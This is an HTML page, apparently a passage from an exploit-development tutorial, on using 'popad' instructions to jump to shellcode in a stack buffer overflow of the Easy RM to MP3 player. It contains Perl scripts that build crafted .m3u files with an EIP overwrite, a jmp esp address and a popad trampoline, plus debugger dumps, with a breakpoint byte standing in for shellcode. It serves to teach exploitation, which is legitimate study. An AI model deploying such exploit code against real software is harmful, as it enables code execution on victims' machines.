<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Some Other Ways To Jump</title>
</head><body><ul><li>popad</li>
<li>hardcode address to jump to</li>
</ul>
<br/>
the “popap” instruction may help us ‘jumping’ to our shellcode as well. popad (pop all double) will pop double words from the stack (ESP) into the general-purpose registers, in one action. The registers are loaded in the following order : EDI, ESI, EBP, EBX, EDX, ECX and EAX.� As a result, the ESP register is incremented after each register is loaded (triggered by the popad). One popad will thus take 32 bytes from ESP and pops them in the registers in an orderly fashion.<br/>
<br/>
The popad opcode is 0x61<br/>
<br/>
So suppose you need to jump 40 bytes, and you only have a couple of bytes to make the jump, you can issue 2 popad’s to point ESP to the shellcode (which starts with NOPs to make up for the (2 times 32 bytes – 40 bytes of space that we need to jump over))<br/>
<br/>
Let’s use the Easy RM to MP3 vulnerability again to demonstrate this technique :<br/>
<br/>
We’ll reuse one of the script example from earlier in this post, and we’ll build a fake buffer that will put 13 X’s at ESP, then we’ll pretend there is some garbage (D’s and A’s) and then place to put our shellcode (NOPS + A’s)<br/>
<br/>
We’ll reuse one of the script example from earlier in this post, and we’ll build a fake buffer that will put 13 X’s at ESP, then we’ll pretend there is some garbage (D’s and A’s) and then place to put our shellcode (NOPS + A’s)<br/>
<br/>
my $file= "test1.m3u";<br/>
my $buffersize = 26094;<br/>
<br/>
my $junk= "A" x 250;<br/>
my $nop = "\x90" x 50;<br/>
my $shellcode = "\xcc";<br/>
<br/>
my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));<br/>
<br/>
my $eip = "BBBB";<br/>
my $preshellcode = "X" x 17; &nbsp;#let's pretend this is the only space we have available<br/>
my $garbage = "\x44" x 100; &nbsp;#let’s pretend this is the space we need to jump over<br/>
<br/>
my $buffer = $junk.$nop.$shellcode.$restofbuffer;<br/>
<br/>
print "Size of buffer : ".length($buffer)."\n";<br/>
<br/>
open($FILE,"&gt;$file");<br/>
print $FILE $buffer.$eip.$preshellcode.$garbage;<br/>
close($FILE);<br/>
print "m3u File Created successfully\n";<br/>
<br/>
�<br/>
<br/>
After opening the file in Easy RM to MP3, the application dies, and ESP looks like this :<br/>
<br/>
First chance exceptions are reported before any exception handling.<br/>
This exception may be expected and handled.<br/>
eax=00000001 ebx=00104a58 ecx=7c91005d edx=003f0000 esi=77c5fce0 edi=0000666d<br/>
eip=42424242 esp=000ff730 ebp=00344158 iopl=0 &nbsp; &nbsp; &nbsp; &nbsp; nv up ei pl nz na pe nc<br/>
cs=001b &nbsp;ss=0023 &nbsp;ds=0023 &nbsp;es=0023 &nbsp;fs=003b &nbsp;gs=0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; efl=00010206<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0x42424231:<br/>
42424242 ?? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;???<br/>
0:000&gt; d esp<br/>
000ff730 &nbsp;58 58 58 58 58 58 58 58-58 58 58 58 58 44 44 44 &nbsp;XXXXXXXXXXXXXDDD | &nbsp;=&gt; 13 bytes<br/>
000ff740 &nbsp;44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 &nbsp;DDDDDDDDDDDDDDDD | &nbsp;=&gt; garbage<br/>
000ff750 &nbsp;44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 &nbsp;DDDDDDDDDDDDDDDD | =&gt; garbage<br/>
000ff760 &nbsp;44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 &nbsp;DDDDDDDDDDDDDDDD | =&gt; garbage<br/>
000ff770 &nbsp;44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 &nbsp;DDDDDDDDDDDDDDDD | =&gt; garbage<br/>
000ff780 &nbsp;44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 &nbsp;DDDDDDDDDDDDDDDD | =&gt; garbage<br/>
000ff790 &nbsp;44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 &nbsp;DDDDDDDDDDDDDDDD | =&gt; garbage<br/>
000ff7a0 &nbsp;00 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;.AAAAAAAAAAAAAAA | =&gt; garbage<br/>
0:000&gt; d<br/>
000ff7b0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff7c0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff7d0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff7e0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff7f0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff800 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff810 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff820 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
0:000&gt; d<br/>
000ff830 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff840 &nbsp;41 41 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;AA.............. | =&gt; garbage<br/>
000ff850 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................ | =&gt; NOPS/Shellcode<br/>
000ff860 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................ | =&gt; NOPS/Shellcode<br/>
000ff870 &nbsp;90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41 &nbsp;.....AAAAAAAAAAA | =&gt; NOPS/Shellcode<br/>
000ff880 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA | =&gt; NOPS/Shellcode<br/>
000ff890 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA | =&gt; NOPS/Shellcode<br/>
000ff8a0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA | =&gt; NOPS/Shellcode<br/>
<br/>
Let’s pretend that we need to use the 13 X’s (so 13 bytes) that are available directly at ESP to jump over 100 D’s (44) and 160 A’s (so a total of 260 bytes) to end up at our shellcode (starts with NOPs, then a breakpoint, and then A’s (=shellcode))<br/>
<br/>
One popad = 32 bytes. So 260 bytes = 9 popad’s (-28 bytes)<br/>
<br/>
(so we need to start our shellcode with nops, or start the shellcode at [start of shellcode]+28 bytes<br/>
<br/>
In our case, we have put some nops before the shellcode, so let’s try to “popad” into the nops and see if the application breaks at our breakpoint.<br/>
<br/>
First, overwrite EIP again with jmp esp. (see one of the previous exploit scripts)<br/>
<br/>
Then, instead of the X’s, perform 9 popad’s, followed by “jmp esp” opcode (0xff,0xe4)<br/>
<br/>
my $file= "test1.m3u";<br/>
my $buffersize = 26094;<br/>
<br/>
my $junk= "A" x 250;<br/>
my $nop = "\x90" x 50;<br/>
my $shellcode = "\xcc";<br/>
<br/>
my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));<br/>
<br/>
my $eip = pack('V',0x01ccf23a); &nbsp;#jmp esp from MSRMCcodec02.dll<br/>
<br/>
my $preshellcode = "X" x 4; &nbsp;# needed to point ESP at next 13 bytes below<br/>
$preshellcode=$preshellcode."\x61" x 9; &nbsp;#9 popads<br/>
$preshellcode=$preshellcode."\xff\xe4"; &nbsp;#10th and 11th byte, jmp esp<br/>
$preshellcode=$preshellcode."\x90\x90\x90"; &nbsp;#fill rest with some nops<br/>
<br/>
my $garbage = "\x44" x 100; &nbsp;#garbage to jump over <br/>
<br/>
my $buffer = $junk.$nop.$shellcode.$restofbuffer;<br/>
<br/>
print "Size of buffer : ".length($buffer)."\n";<br/>
<br/>
open($FILE,"&gt;$file");<br/>
print $FILE $buffer.$eip.$preshellcode.$garbage;<br/>
close($FILE);<br/>
print "m3u File Created successfully\n";<br/>
<br/>
After opening the file, the application does indeed break at the breakpoint. EIP and ESP look like this :<br/>
<br/>
f40.5f0): Break instruction exception - code 80000003 (first chance)<br/>
eax=90909090 ebx=90904141 ecx=90909090 edx=90909090 esi=41414141 edi=41414141<br/>
eip=000ff874 esp=000ff850 ebp=41414141 iopl=0 &nbsp; &nbsp; &nbsp; &nbsp; nv up ei pl nz na pe nc<br/>
cs=001b &nbsp;ss=0023 &nbsp;ds=0023 &nbsp;es=0023 &nbsp;fs=003b &nbsp;gs=0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; efl=00000206<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0xff863:<br/>
000ff874 cc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;int &nbsp; &nbsp; 3<br/>
0:000&gt; d eip<br/>
000ff874 &nbsp;cc 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;.AAAAAAAAAAAAAAA<br/>
000ff884 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff894 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff8a4 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff8b4 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff8c4 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff8d4 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff8e4 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
0:000&gt; d eip-32<br/>
000ff842 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff852 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff862 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff872 &nbsp;90 90 cc 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;...AAAAAAAAAAAAA<br/>
000ff882 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff892 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff8a2 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff8b2 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
0:000&gt; d esp<br/>
000ff850 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff860 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff870 &nbsp;90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41 &nbsp;.....AAAAAAAAAAA<br/>
000ff880 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff890 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff8a0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff8b0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff8c0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
<br/>
=&gt; the popad’s have worked and made esp point at the nops. Then the jump to esp was made (0xff 0xe4), which made EIP jump to nops, and slide to the breakpoint (at 000f874)<br/>
<br/>
Replace the A’s with real shellcode :<br/>
pnwed again !<br/>
</body></html>